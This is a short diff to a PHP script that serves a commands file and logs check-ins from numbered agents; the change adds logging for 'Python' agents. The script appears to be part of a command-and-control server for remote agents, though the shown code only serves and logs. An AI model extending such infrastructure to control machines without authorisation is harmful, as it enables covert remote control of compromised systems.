@@ -1,4 +1,4 @@
- <?php
+<?php
 
 echo file_get_contents("/var/www/html/cmds.txt");
 
@@ -28,6 +28,11 @@ $current .= "Last Ping - Agent ".$id." (Linux) => ".$time.PHP_EOL;
 file_put_contents($file, $current);
 }
 
+if ($os == "P"){
+$current = file_get_contents($file);
+$current .= "Last Ping - Agent ".$id." (Python) => ".$time.PHP_EOL;
+file_put_contents($file, $current);
+}
 
 }
 
